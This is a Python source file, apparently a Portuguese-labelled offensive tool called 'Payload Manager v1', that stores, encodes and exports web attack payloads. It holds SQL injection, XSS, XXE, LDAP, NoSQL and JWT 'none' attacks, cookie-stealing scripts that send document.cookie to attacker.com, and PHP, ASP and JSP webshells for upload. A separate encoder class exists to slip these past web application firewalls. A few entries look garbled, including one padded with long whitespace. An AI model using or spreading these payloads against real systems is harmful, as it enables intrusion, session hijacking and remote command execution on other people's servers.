"""
Payload Manager v1 — Gerenciar, gerar e armazenar payloads de ataque
Suporta: SQLi, XSS, LFI, SSRF, RCE, path traversal, command injection, etc.
"""

import sys
import os
import json
import time
import hashlib
import logging
import base64
import urllib.parse
import re
from pathlib import Path
from typing import Dict, List, Optional, Any, Tuple
from datetime import datetime
from collections import defaultdict

log_dir = Path(__file__).parent / 'log'
log_dir.mkdir(exist_ok=True)

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(name)s: %(message)s',
    handlers=[
        logging.FileHandler(log_dir / 'payload_manager.log', encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger('payload_mgr')


# =========================================================================
# Payload Templates
# =========================================================================

PAYLOAD_TEMPLATES = {
    # SQL Injection
    'sqli_basic': {
        'category': 'sqli',
        'subcat': 'error_based',
        'payloads': [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT NULL--",
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT 1,version(),3--",
            "' UNION SELECT 1,@@version,3--",
            "1' ORDER BY 1--",
            "1' ORDER BY 2--",
            "1' ORDER BY 3--",
            "1' UNION SELECT NULL,NULL--",
            "' AND 1=1 UNION SELECT NULL,NULL,NULL--",
            "' AND 1=2 UNION SELECT table_name,NULL,NULL FROM information_schema.tables--",
        ]
    },
    'sqli_blind': {
        'category': 'sqli',
        'subcat': 'blind_boolean',
        'payloads': [
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND SUBSTRING(@@version,1,1)='5'--",
            "' AND SUBSTRING(@@version,1,1)='10'--",
            "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
            "' AND (SELECT COUNT(*) FROM admin_users)>0--",
            "' AND (SELECT COUNT(column_name) FROM information_schema.columns WHERE table_name='users')>0--",
        ]
    },
    'sqli_time': {
        'category': 'sqli',
        'subcat': 'blind_time',
        'payloads': [
            "' AND SLEEP(5)--",
            "' AND sleep(5)--",
            "' AND IF(1=1,SLEEP(5),0)--",
            "WAITFOR DELAY '0:0:5'--",
            "' OR BENCHMARK(10000000,SHA1('test'))--",
        ]
    },
    'sqli_union': {
        'category': 'sqli',
        'subcat': 'union_extract',
        'payloads': [
            "' UNION SELECT 1,2,3,4,5--",
            "' UNION SELECT 1,2,3,4,5,6--",
            "' UNION SELECT 1,@@version,3,4,5--",
            "' UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables--",
            "' UNION SELECT 1,column_name,3,4,5 FROM information_schema.columns WHERE table_name='users'--",
            "' UNION SELECT 1,username,3,password,5 FROM users--",
            "' UNION SELECT 1,group_concat(table_name),3,4,5 FROM information_schema.tables--",
            "' UNION SELECT 1,group_concat(column_name),3,4,5 FROM information_schema.columns WHERE table_schema=database()--",
        ]
    },
    
    # XSS
    'xss_reflected': {
        'category': 'xss',
        'subcat': 'reflected',
        'payloads': [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg/onload=alert(1)>',
            '<iframe src="javascript:alert(1)">',
            '<body onload=alert(1)>',
            '<details open ontoggle=alert(1)>',
            '<input autofocus onfocus=alert(1)>',
            '<marquee onstart=alert(1)>',
            '<video><source onerror="javascript:alert(1)">',
            '<body background="javascript:alert(1)">',
            '"><script>alert(document.cookie)</script>',
            '" onclick="alert(1)" x="',
            "' onmouseover='alert(1)'",
            '"><img src=x onerror=alert(`XSS`)>',
        ]
    },
    'xss_stored': {
        'category': 'xss',
        'subcat': 'stored',
        'payloads': [
            '<script>fetch("http://attacker.com/steal?c="+document.cookie)</script>',
            '<img src=x onerror="new Image().src=\'http://attacker.com/?cookie=\' + document.cookie">',
            '<a href="javascript:fetch(\'http://attacker.com/\'+document.cookie)">click</a>',
            '<script>new Image().src="http://attacker.com/log?c="+document.cookie;</script>',
        ]
    },
    'xss_encoded': {
        'category': 'xss',
        'subcat': 'encoded_bypass',
        'payloads': [
            '%3Cscript%3Ealert(1)%3C%2Fscript%3E',
            '<sCrIpT>alert(1)</sCrIpT>',
            '<ScRiPt>aleRt(1)</ScRiPt>',
            '\u003cscript\u003ealert(1)\u003c/script\u003e',
            '<%                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           %>',
            '<%Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));%>',
            '<%=request.getParameter("cmd")%>',
            '<%=application.initialize()%>',
        ]
    },
    'rce_python': {
        'category': 'rce',
        'subcat': 'python',
        'payloads': [
            'import os; os.system("id")',
            'import os; print(os.popen("id").read())',
            '__import__("os").system("id")',
        ]
    },
    
    # Authentication Bypass
    'auth_bypass': {
        'category': 'auth',
        'subcat': 'bypass',
        'payloads': [
            "' OR '1'='1' --",
            "' OR 1=1 --",
            "' OR 'x'='x",
            'admin' + chr(32) + '--',
            "' OR ''='",
            "' OR 1=1#",
            "' OR 1=1 /*",
            "admin'--",
            "' OR '1'='1' LIMIT 1 --",
            "1' AND 1=1 UNION SELECT 1,2,3--",
        ]
    },
    
    # LDAP Injection
    'ldap': {
        'category': 'ldap',
        'subcat': 'injection',
        'payloads': [
            '*)(|(objectclass=*)',
            '*)(uid=*))(|(uid=*',
            '*)(|(mail=*))',
            '*)(objectclass=*)',
            '*))%00',
            ')(cn=*))(|(cn=*',
            '*/*',
        ]
    },
    
    # XPath Injection
    'xpath': {
        'category': 'xpath',
        'subcat': 'injection',
        'payloads': [
            "' or '1'='1'",
            "' or ''='",
            "' or name()='username' or '1'='1",
            "' and string-length(name())>0 and '1'='1",
            "' or 1=1 or '",
            "' or name()='*' or '",
        ]
    },
    
    # XXE
    'xxe': {
        'category': 'xxe',
        'subcat': 'injection',
        'payloads': [
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<soap:Body><foo>&xxe;</foo></soap:Body>',
        ]
    },
    
    # Header Injection
    'header_injection': {
        'category': 'injection',
        'subcat': 'header',
        'payloads': [
            'Host: vulnerable.com\r\nX-Forwarded-For: 127.0.0.1\r\nCookie: admin=true\r\n',
            'Host: localhost:8080\r\n',
            'Host: internal.service.local\r\n',
        ]
    },
    
    # File Upload
    'file_upload': {
        'category': 'upload',
        'subcat': 'webshell',
        'payloads': [
            ('shell.php', '<?php echo shell_exec($_GET["cmd"]); ?>'),
            ('shell.asp', '<% Execute(Request("cmd")) %>'),
            ('shell.aspx', '<%@ Page Language="C#" %><% Response.Write(System.IO.Directory.GetFiles(".")); %>'),
            ('shell.jsp', '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>'),
            ('shell.py', '#!/usr/bin/env python\nimport os\nos.system(os.environ.get("CMD","id"))'),
            ('shell.pl', '<?system($_GET[0]);?>'),
            ('shell.rb', '<%require"open3";puts Open3.capture3(params["cmd"])%>'),
        ]
    },
    
    # JWT Attacks
    'jwt_attack': {
        'category': 'jwt',
        'subcat': 'attacks',
        'payloads': [
            # Algorithm confusion
            '{"alg":"none","typ":"JWT"}.',
            '{"alg":"HS256","typ":"JWT"}.eyJzdWIiOiIxMjM0NTY3ODkwIn0.',
            # Empty signature
            'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIn0.',
        ]
    },
    
    # Deserialization
    'deserialization': {
        'category': 'deser',
        'subcat': 'payloads',
        'payloads': [
            # Java
            'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFpZXCgMxAAJGAA9sb2FkRmFjdG9ySUADdGhyZXNob2xkeA egAPAACgkNCgQABgAIEglKBgBbTACEZ2VuZXJhdG9yLmphdmEM/fV7k/uZqwoLAAA.AAECBQAIAAoBABJKABNqYXZhLmxhbmco.ZW51bQEAe' + 'GsuUnVubmluZ1N0YXRlAEIDTU',
            # Python pickle
            'cos\nsystem\n(S\"id\"\n.',
            # PHP
            'O:8:"stdClass":0:{}',
            'O:4:"User":1:{s:9:"\0*\0username";s:5:"admin";}O:9:"Blacklist":0:{}',
        ]
    },
    
    # Open Redirect
    'open_redirect': {
        'category': 'redirect',
        'subcat': 'open_redirect',
        'payloads': [
            'http://attacker.com',
            '//attacker.com',
            '/\/attacker.com',
            '\\\\attacker.com',
            'https://attacker.com',
            'javascript:alert(1)',
            'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
        ]
    },
    
    # NoSQL Injection
    'nosql': {
        'category': 'nosql',
        'subcat': 'injection',
        'payloads': [
            '{"username": {"$ne": null}, "password": {"$ne": null}}',
            '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
            '{"$where": "return true"}',
            '{"$where": "return this.role===\'admin\'"}',
            'true == true; print(db.users.findOne()) //',
            '}{ "username": {"$ne": null} }{ "password": {"$ne": null} }',
        ]
    },
}


# =========================================================================
# Payload Encoder
# =========================================================================

class PayloadEncoder:
    """Encode payloads to bypass WAF/filtering"""
    
    @staticmethod
    def url_encode(payload: str, double: bool = False) -> str:
        """URL encode payload"""
        encoded = urllib.parse.quote(payload)
        if double:
            encoded = urllib.parse.quote(encoded)
        return encoded
    
    @staticmethod
    def html_encode(payload: str) -> str:
        """HTML entity encode"""
        return payload.replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;').replace("'", '&#x27;')
    
    @staticmethod
    def base64_encode(payload: str) -> str:
        """Base64 encode"""
        return base64.b64encode(payload.encode()).decode()
    
    @staticmethod
    def utf8_encode(payload: str) -> str:
        """UTF-8 percent encode"""
        return ''.join(f'%{ord(c):02X}' for c in payload)
    
    @staticmethod
    def unicode_encode(payload: str) -> str:
        """Unicode escape encode"""
        return ''.join(f'\\u{ord(c):04x}' for c in payload)
    
    @staticmethod
    def hex_encode(payload: str) -> str:
        """Hex encode"""
        return ''.join(f'\\x{ord(c):02x}' for c in payload)
    
    @staticmethod
    def mix_encoding(payload: str) -> List[str]:
        """Mix multiple encodings for WAF bypass"""
        results = []
        results.append(payload)  # Original
        results.append(PayloadEncoder.url_encode(payload))
        results.append(PayloadEncoder.url_encode(payload, double=True))
        results.append(PayloadEncoder.html_encode(payload))
        results.append(PayloadEncoder.base64_encode(payload))
        results.append(PayloadEncoder.utf8_encode(payload))
        results.append(PayloadEncoder.unicode_encode(payload))
        results.append(PayloadEncoder.hex_encode(payload))
        return results


# =========================================================================
# Main Engine
# =========================================================================

class PayloadManager:
    """Manage, generate, and encode attack payloads"""
    
    def __init__(self):
        self.templates = PAYLOAD_TEMPLATES
        self.encoder = PayloadEncoder()
        self._stored = {}  # Custom stored payloads
        self._db_path = Path(__file__).parent / 'payloads.json'
        self._load_db()
    
    def _load_db(self):
        """Load stored payloads from JSON file"""
        if self._db_path.exists():
            try:
                with open(self._db_path, 'r', encoding='utf-8') as f:
                    self._stored = json.load(f)
            except:
                self._stored = {}
    
    def _save_db(self):
        """Save stored payloads to JSON file"""
        with open(self._db_path, 'w', encoding='utf-8') as f:
            json.dump(self._stored, f, indent=2)
    
    def list_categories(self) -> List[str]:
        """List all payload categories"""
        return sorted(set(t['category'] for t in self.templates.values()))
    
    def list_subcategories(self, category: str) -> List[str]:
        """List subcategories for a category"""
        return sorted(set(
            t['subcat'] for t in self.templates.values() 
            if t['category'] == category
        ))
    
    def get_payloads(self, category: str, subcat: Optional[str] = None) -> List[str]:
        """Get payloads by category/subcategory"""
        payloads = []
        for key, template in self.templates.items():
            if template['category'] == category:
                if subcat is None or template['subcat'] == subcat:
                    payloads.extend(template['payloads'])
        
        # Add custom stored payloads
        cat_stored = self._stored.get(category, {})
        if subcat:
            payloads.extend(cat_stored.get(subcat, []))
        else:
            for sc, ps in cat_stored.items():
                payloads.extend(ps)
        
        return list(set(payloads))
    
    def store_payload(self, category: str, subcat: str, payload: str):
        """Store a custom payload"""
        if category not in self._stored:
            self._stored[category] = {}
        if subcat not in self._stored[category]:
            self._stored[category][subcat] = []
        if payload not in self._stored[category][subcat]:
            self._stored[category][subcat].append(payload)
            self._save_db()
            return True
        return False
    
    def remove_payload(self, category: str, subcat: str, payload: str) -> bool:
        """Remove a stored payload"""
        if category in self._stored and subcat in self._stored[category]:
            if payload in self._stored[category][subcat]:
                self._stored[category][subcat].remove(payload)
                self._save_db()
                return True
        return False
    
    def encode_payload(self, payload: str, method: str = 'url') -> str:
        """Encode a payload using specified method"""
        methods = {
            'url': self.encoder.url_encode,
            'url_double': lambda p: self.encoder.url_encode(p, double=True),
            'html': self.encoder.html_encode,
            'base64': self.encoder.base64_encode,
            'utf8': self.encoder.utf8_encode,
            'unicode': self.encoder.unicode_encode,
            'hex': self.encoder.hex_encode,
            'mix': lambda p: self.encoder.mix_encoding(p)[0],  # Returns original
        }
        return methods.get(method, methods['url'])(payload)
    
    def encode_all(self, payloads: List[str], method: str = 'url') -> List[str]:
        """Encode all payloads"""
        methods = {
            'url': self.encoder.url_encode,
            'url_double': lambda p: self.encoder.url_encode(p, double=True),
            'html': self.encoder.html_encode,
            'base64': self.encoder.base64_encode,
            'utf8': self.encoder.utf8_encode,
            'unicode': self.encoder.unicode_encode,
            'hex': self.encoder.hex_encode,
        }
        encoder = methods.get(method, methods['url'])
        return [encoder(p) for p in payloads]
    
    def generate_wordlist(self, length_min: int = 3, length_max: int = 12, 
                          charset: str = 'abcdefghijklmnopqrstuvwxyz0123456789') -> List[str]:
        """Generate combinatorial wordlist (limited to avoid explosion)"""
        import itertools
        words = []
        max_combos = 100000  # Limit
        
        for length in range(length_min, length_max + 1):
            if len(words) >= max_combos:
                break
            for combo in itertools.product(charset, repeat=length):
                words.append(''.join(combo))
                if len(words) >= max_combos:
                    break
            if len(words) >= max_combos:
                break
        
        return words[:max_combos]
    
    def get_stats(self) -> Dict:
        """Get payload statistics"""
        total = sum(len(t['payloads']) for t in self.templates.values())
        by_category = defaultdict(int)
        for t in self.templates.values():
            by_category[t['category']] += len(t['payloads'])
        
        return {
            'total_templates': len(self.templates),
            'total_payloads': total,
            'by_category': dict(by_category),
            'custom_stored': sum(
                len(ps) 
                for cat in self._stored.values() 
                for ps in cat.values()
            ),
        }
    
    def export_payloads(self, category: Optional[str] = None, 
                        format: str = 'text') -> str:
        """Export payloads to text or JSON"""
        if category:
            payloads = self.get_payloads(category)
        else:
            payloads = []
            for cat in self.list_categories():
                payloads.extend(self.get_payloads(cat))
        
        if format == 'json':
            return json.dumps(payloads, indent=2)
        else:
            return '\n'.join(payloads)


# =========================================================================
# CLI Entry
# =========================================================================

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='Payload Manager v1 — Gerenciador de payloads de ataque')
    parser.add_argument('--list-categories', '-l', action='store_true', help='List categories')
    parser.add_argument('--list', '-L', metavar='CATEGORY', help='List payloads in category')
    parser.add_argument('--get', '-g', nargs=2, metavar=('CATEGORY', 'SUBCAT'), help='Get specific payloads')
    parser.add_argument('--encode', '-e', nargs=2, metavar=('METHOD', 'PAYLOAD'), help='Encode a payload')
    parser.add_argument('--encode-all', '-E', nargs=2, metavar=('METHOD', 'FILE'), help='Encode all payloads in file')
    parser.add_argument('--store', '-s', nargs=3, metavar=('CATEGORY', 'SUBCAT', 'PAYLOAD'), help='Store custom payload')
    parser.add_argument('--remove', '-r', nargs=3, metavar=('CATEGORY', 'SUBCAT', 'PAYLOAD'), help='Remove stored payload')
    parser.add_argument('--stats', '-S', action='store_true', help='Show statistics')
    parser.add_argument('--export', '-x', metavar='CATEGORY', help='Export payloads')
    parser.add_argument('--generate', '-G', nargs='*', metavar='LENGTH', help='Generate combinatorial wordlist')
    parser.add_argument('--json', '-j', action='store_true', help='JSON output')
    
    args = parser.parse_args()
    mgr = PayloadManager()
    
    if args.list_categories:
        print("\nPayload Categories:")
        for cat in mgr.list_categories():
            count = len(mgr.get_payloads(cat))
            print(f"  {cat:20s} ({count} payloads)")
        print()
        sys.exit(0)
    
    if args.list:
        payloads = mgr.get_payloads(args.list)
        if args.json:
            print(json.dumps(payloads, indent=2))
        else:
            print(f"\n{args.list} payloads ({len(payloads)}):")
            for i, p in enumerate(payloads, 1):
                print(f"  {i:3d}. {p}")
        print()
        sys.exit(0)
    
    if args.get:
        cat, subcat = args.get
        payloads = mgr.get_payloads(cat, subcat)
        if args.json:
            print(json.dumps(payloads, indent=2))
        else:
            print(f"\n{cat}/{subcat} payloads ({len(payloads)}):")
            for i, p in enumerate(payloads, 1):
                print(f"  {i:3d}. {p}")
        print()
        sys.exit(0)
    
    if args.encode:
        method, payload = args.encode
        encoded = mgr.encode_payload(payload, method)
        print(json.dumps({'original': payload, 'method': method, 'encoded': encoded}, indent=2))
        sys.exit(0)
    
    if args.encode_all:
        method, filepath = args.encode_all
        with open(filepath, 'r', encoding='utf-8', errors='replace') as f:
            payloads = [line.strip() for line in f if line.strip()]
        encoded = mgr.encode_all(payloads, method)
        output = filepath.rsplit('.', 1)[0] + f'_encoded_{method}.' + filepath.rsplit('.', 1)[1]
        with open(output, 'w', encoding='utf-8') as f:
            f.write('\n'.join(encoded) + '\n')
        print(f"[+] Encoded {len(encoded)} payloads → {output}")
        sys.exit(0)
    
    if args.store:
        cat, subcat, payload = args.store
        if mgr.store_payload(cat, subcat, payload):
            print(f"[+] Stored: {cat}/{subcat} → {payload[:50]}")
        else:
            print(f"[!] Payload already exists in store")
        sys.exit(0)
    
    if args.remove:
        cat, subcat, payload = args.remove
        if mgr.remove_payload(cat, subcat, payload):
            print(f"[+] Removed: {cat}/{subcat} → {payload[:50]}")
        else:
            print(f"[!] Payload not found in store")
        sys.exit(0)
    
    if args.stats:
        stats = mgr.get_stats()
        print(json.dumps(stats, indent=2))
        sys.exit(0)
    
    if args.export:
        data = mgr.export_payloads(args.export)
        print(data)
        sys.exit(0)
    
    if args.generate:
        lengths = [int(l) for l in args.generate] if args.generate else [3, 6]
        if len(lengths) == 1:
            lengths = [lengths[0], lengths[0]]
        words = mgr.generate_wordlist(lengths[0], lengths[1])
        print(f"Generated {len(words)} words")
        if args.json:
            print(json.dumps(words[:100], indent=2))
        else:
            for w in words[:50]:
                print(w)
            if len(words) > 50:
                print(f"... ({len(words) - 50} more)")
        sys.exit(0)
    
    # Default: show help
    print("""
Payload Manager v1 — Gerenciador de payloads de ataque
Uso:
  python payload_manager.py --list-categories          # List all categories
  python payload_manager.py --list sqli                # List SQLi payloads
  python payload_manager.py --get sqli error_based     # Get specific payloads
  python payload_manager.py --encode url "<script>"    # Encode payload
  python payload_manager.py --store sqli custom "..."  # Store custom payload
  python payload_manager.py --remove sqli custom "..." # Remove stored payload
  python payload_manager.py --stats                    # Statistics
  python payload_manager.py --export sqli              # Export payloads
  python payload_manager.py --generate 3 6             # Generate wordlist
""")


if __name__ == '__main__':
    main()
